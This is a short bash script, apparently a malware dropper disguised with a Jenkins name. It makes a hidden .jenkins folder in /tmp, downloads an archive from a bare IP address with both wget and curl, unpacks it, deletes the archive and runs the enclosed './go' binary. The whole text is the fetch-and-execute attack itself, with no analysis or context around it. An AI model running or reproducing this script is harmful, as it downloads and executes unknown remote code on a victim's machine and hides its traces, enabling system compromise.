#!/bin/bash

cd /tmp
mkdir .jenkins
cd .jenkins
wget 45.55.211.79/.cache/jenkins/jks.tar.gz
curl -O 45.55.211.79/.cache/jenkins/jks.tar.gz
tar -zxvf jks.tar.gz
rm -rf jks.tar.gz*
cd jenkins
./go

